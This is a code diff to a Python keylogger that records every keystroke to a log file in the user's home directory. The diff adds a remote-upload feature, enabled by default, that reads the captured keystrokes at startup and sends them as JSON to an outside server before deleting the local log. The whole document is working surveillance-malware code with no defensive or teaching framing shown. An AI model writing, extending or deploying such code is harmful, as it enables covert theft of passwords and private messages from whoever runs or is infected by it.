@@ -1,6 +1,8 @@
 from functools import partial
+from urllib import request
 from pathlib import Path
 import atexit
+import json
 import os
 
 import keyboard
@@ -10,7 +12,8 @@ MAP = {
   "\r": "\n"
 }
 
-FILE_NAME = "{0}/kst.log".format(str(Path.home()))
+FILE_NAME = "{0}/ksts.log".format(str(Path.home()))
+SEND_TO_REMOTE_SERVER = True
 CLEAR_ON_STARTUP = True
 TERMINATE_KEY = "f7"
 
@@ -37,6 +40,22 @@ def onexit(output):
   output.close()
 
 def main():
+  if SEND_TO_REMOTE_SERVER:
+    if os.path.exists(FILE_NAME):
+      file = open(FILE_NAME, "r").read()
+      array_data = {
+        "data": file,
+        "type": "keylogger"
+      }
+      data = json.dumps(array_data).encode('utf8')
+      req = request.Request(
+        "https://marroquin.dev/api/tests",
+        data=data,
+        headers={
+          'content-type': 'application/json'
+        }
+      )
+      request.urlopen(req)
   if CLEAR_ON_STARTUP:
     if os.path.exists(FILE_NAME):
       os.remove(FILE_NAME) # Delete the old file
